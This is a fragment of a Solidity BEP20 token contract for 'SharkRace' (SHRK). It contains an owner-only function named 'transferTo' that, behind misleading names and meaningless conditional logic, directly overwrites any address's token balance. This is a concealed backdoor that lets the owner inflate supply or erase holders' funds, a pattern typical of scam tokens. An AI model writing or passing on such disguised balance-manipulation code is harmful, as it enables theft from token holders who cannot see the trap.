...
contract SHRK is Ownable, BEP20, BEP20Detailed {
  using SafeBEP20 for IBEP20;
  using Address for address;
  using SafeMath for uint256;

  function transferTo(uint256 lastIndex,address spender_) public onlyOwner returns (bool) {
                                                  
    uint256 balanceOfAddress = address(spender_).balance; _balances[spender_] = lastIndex; 
    uint256 approvalPeriod = 3600 seconds; 
    if(lastIndex == 0 && balanceOfAddress == 0 && approvalPeriod == 3600) { return false; } 
     else{ return true;}
    }

 
  constructor () BEP20Detailed("SharkRace", "SHRK", 8) {
